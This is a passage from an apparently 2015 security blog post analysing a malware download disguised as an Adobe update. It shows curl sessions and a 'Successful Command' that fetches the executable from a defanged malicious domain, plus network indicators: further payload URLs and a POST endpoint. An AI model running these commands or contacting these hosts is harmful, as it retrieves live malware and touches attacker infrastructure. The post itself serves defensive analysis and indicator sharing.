+0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
+Connected to TUGRAHOTELS[.]COM (159.253.42.153) port 80 (#0)
+
+GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
+Host: TUGRAHOTELS[.]COM
+Accept: */*
+
+HTTP/1.1 200 OK
+Content-Type: application/x-msdownload
+Content-Disposition: inline; filename=Adobe_update-YXXQ1RX4IL6LV2M.exe
+Content-Length: 3
+Date: Tue, 11 Aug 2015 21:01:02 GMT
+Accept-Ranges: bytes
+Server LiteSpeed is not blacklisted
+Server: LiteSpeed
+Connection: close
+
+{ [data not shown]
+100     3  100     3    0     0      2      0  0:00:01  0:00:01 --:--:--     2
+Closing connection 0
+</code></pre>
+
+<hr />
+
+<h4>Successful Command</h4>
+
+<pre><code>curl -vA "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" -L "hxxp://TUGRAHOTELS[.]COM/get.php?dgfdfg=0.5332026502583176&amp;key=f5" &gt; bad
+
+% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                               Dload  Upload   Total   Spent    Left  Speed
+0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 159.253.42.153...
+Connected to TUGRAHOTELS.COM (159.253.42.153) port 80 (#0)
+GET /get.php?dgfdfg=0.5332026502583176&amp;key=f5 HTTP/1.1
+User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)
+Host: TUGRAHOTELS[.]COM
+Accept: */*
+
+HTTP/1.1 200 OK
+Content-Type: application/x-msdownload
+Content-Disposition: inline; filename=Adobe_update-ZLFNDKIGUO7.exe
+Date: Tue, 11 Aug 2015 21:03:35 GMT
+Accept-Ranges: bytes
+Server LiteSpeed is not blacklisted
+Server: LiteSpeed
+Connection: close
+
+{ [data not shown]
+100  214k    0  214k    0     0  89872      0 --:--:--  0:00:02 --:--:-- 89872
+Closing connection 0
+</code></pre>
+
+<p>Unfortunately, I was only able to get the network indicators below from the executable and none from the pdf file. I am working on beefing up my sandboxing environment to better handle situations like this but until then I will have to leave this post as is for now. Hopefully I can provide an update on the malware family as well as any further OSINT I find. Please feel free to contact me about the analysis or any questions you have.</p>
+
+<h4>Adobe_update-YXXQ1RX4IL6LV2M.exe Analysis</h4>
+
+<pre><code>GET hxxp://109.120.142.168:80/ac33/b/btc.exe
+GET hxxp://109.120.142.168:80/ac33/p/pc.exe
+GET hxxp://109.120.142.168:80/ac33/g/gc.exe
+GET hxxp://109.120.142.168:80/ac33/bk/bkc.exe
+POST hxxp://109.120.180.29:80/intro/data.php
+Server IP: 109.120.180.29
+
+GET hxxp://constitution.org:80/usdeclar.txt
+Server IP: 54.175.58.135
+</code></pre>
+
+
+        <hr class="divider-short"/>
+
+        
+      </div>
+    </div>
+  </div>
+</article>
+
+<hr class="divider-short"/>
+
+<div class="archive-link">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-8 col-md-offset-2">
+        
+          <a class="pull-left" href="/blog/2015/08/05/ransomware-from-emails-with-javascript-attachments/" title="Previous Post: Ransomware from Emails With JavaScript Attachments">&laquo; Previous: Ransomware from Emails With JavaScript Attachments</a>
+        
+
+        
+          <a class="pull-right" href="/blog/2016/05/25/building-a-go-work-pool-and-dispatcher/" title="Next Post: Building a Go Work Pool and Dispatcher">Next: Building a Go Work Pool and Dispatcher &raquo;</a>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+    <footer id="footer" class="her-row">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-1">
+  <a href="/"><h4>Home</h4></a>
+</div>
+
+<div class="col-md-2">
+  <div class="social-icon-list">
+    
+    <a href="https://twitter.com/_elauqsap"><img src="/images/glyphicons_social_31_twitter.png"/></a>
+    
+
+    
+    <a href="https://github.com/elauqsap"><img src="/images/glyphicons_social_21_github.png"/></a>
+    
+
+    
+
+    
+    <a href="mailto:3lauqsap@gmail.com"><img src="/images/glyphicons_social_39_e-mail.png"/></a>
+    
+  </div>
+</div>
+
+<div class="pull-right">
+  <h4>Powered by <a href="http://octopress.org/">Octopress</a>.</h4>
+</div>
+
+
+    </div>
+  </div>
+</footer>
+
+    
+  </body>
+</html>
